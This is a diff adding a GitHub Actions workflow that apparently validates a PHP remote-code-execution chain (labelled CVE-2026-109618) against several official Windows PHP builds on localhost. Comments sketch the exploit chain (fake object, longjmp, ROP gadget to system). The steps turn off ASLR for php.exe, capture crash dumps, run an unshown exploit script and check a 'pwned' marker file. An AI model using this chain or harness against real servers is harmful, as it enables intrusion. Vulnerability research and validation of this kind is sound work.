@@ -1,0 +1,94 @@
+name: p2s-win-rce
+
+# php2shell (CVE-2026-109618) Windows x64 RCE validation, exact official builds.
+# Chain: urlencoded OOM -> half-built HashTable -> shutdown dtor on unwritten
+# bucket -> fake object -> free_obj = ucrtbase!longjmp -> pop rcx;ret -> system(cmd).
+# Determinism: Set-ProcessMitigation ForceRelocateImages disabled (ASLR off) +
+# WER LocalDumps full crash dumps as the measurement channel (in-run parse).
+
+on: [push, workflow_dispatch]
+
+jobs:
+  rce:
+    runs-on: windows-latest
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - { php: '7.4.33', url: 'https://windows.php.net/downloads/releases/php-7.4.33-nts-Win32-vc15-x64.zip' }
+          - { php: '8.0.30', url: 'https://windows.php.net/downloads/releases/php-8.0.30-nts-Win32-vs16-x64.zip' }
+          - { php: '8.1.31', url: 'https://windows.php.net/downloads/releases/archives/php-8.1.31-nts-Win32-vs16-x64.zip' }
+          - { php: '8.2.12', url: 'https://windows.php.net/downloads/releases/archives/php-8.2.12-nts-Win32-vs16-x64.zip' }
+          - { php: '8.3.35', url: 'https://windows.php.net/downloads/releases/archives/php-8.3.35-nts-Win32-vs16-x64.zip' }
+          - { php: '8.4.26', url: 'https://windows.php.net/downloads/releases/archives/php-8.4.26-nts-Win32-vs17-x64.zip' }
+          - { php: '8.5.11', url: 'https://windows.php.net/downloads/releases/archives/php-8.5.11-nts-Win32-vs17-x64.zip' }
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: stage exact php build
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $zip = "$env:RUNNER_TEMP\p2sphp.zip"
+          curl.exe -sSL -o $zip --retry 3 "${{ matrix.url }}"
+          Write-Host ("zip_bytes=" + (Get-Item $zip).Length)
+          Expand-Archive -Path $zip -DestinationPath "$env:RUNNER_TEMP\p2szip" -Force
+          $inner = Get-ChildItem "$env:RUNNER_TEMP\p2szip"
+          if ($inner.Count -eq 1 -and $inner[0].PSIsContainer) { $phpdir = $inner[0].FullName } else { $phpdir = "$env:RUNNER_TEMP\p2szip" }
+          $phpdir | Out-File "$env:RUNNER_TEMP\phpdir.txt" -Encoding ascii
+          $env:PATH = "$phpdir;" + $env:PATH
+          $v = & "$phpdir\php.exe" -v 2>&1 | Select-Object -First 1
+          Write-Host "php -v: $v"
+          $ts = & "$phpdir\php.exe" -i 2>&1 | Select-String -Pattern 'Thread Safety'
+          Write-Host "php -i: $ts"
+          if ("$v" -notmatch '${{ matrix.php }}') {
+            Write-Host "::error::P2S_VERSION_MISMATCH expected ${{ matrix.php }} got $v"
+            exit 1
+          }
+
+      - name: aslr off + wer localdumps
+        shell: pwsh
+        run: |
+          $dumpdir = "$env:RUNNER_TEMP\p2sdumps"
+          New-Item -ItemType Directory -Force -Path $dumpdir | Out-Null
+          Set-ProcessMitigation -Name php.exe -Disable ForceRelocateImages
+          Get-ProcessMitigation -Name php.exe | Out-String | Write-Host
+          $ld = 'HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\php.exe'
+          New-Item -Path $ld -Force | Out-Null
+          Set-ItemProperty -Path $ld -Name DumpFolder -Value $dumpdir -Type ExpandString
+          Set-ItemProperty -Path $ld -Name DumpType -Value 2 -Type DWord
+          Set-ItemProperty -Path $ld -Name DumpCount -Value 10 -Type DWord
+          Write-Host "wer localdumps -> $dumpdir (DumpType=2 full)"
+
+      - name: rce driver (single step)
+        shell: pwsh
+        run: |
+          $phpdir = (Get-Content "$env:RUNNER_TEMP\phpdir.txt" -Raw).Trim()
+          $dumpdir = "$env:RUNNER_TEMP\p2sdumps"
+          $marker = "$env:RUNNER_TEMP\p2s_pwned.txt"
+          python p2s/win_rce.py --php-dir "$phpdir" --version '${{ matrix.php }}' `
+            --host 127.0.0.1 --port 8097 --dump-dir "$dumpdir" `
+            --marker "$marker" --out "win_rce_result_${{ matrix.php }}.json"
+          $rc = $LASTEXITCODE
+          Write-Host "WIN_RCE_RC=$rc"
+          if (Test-Path $marker) {
+            Write-Host "=== MARKER CONTENT ==="
+            Get-Content $marker | ForEach-Object { Write-Host ("marker: " + $_) }
+          } else {
+            Write-Host "=== NO MARKER ==="
+          }
+          exit $rc
+
+      - name: upload receipts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: p2s-win-rce-${{ matrix.php }}
+          path: |
+            win_rce_result_*.json
+            ${{ runner.temp }}\p2s_pwned.txt
+            ${{ runner.temp }}\p2sdumps\*.dmp
+            ${{ runner.temp }}\php_err.log
+            ${{ runner.temp }}\php_server.log
+          if-no-files-found: ignore
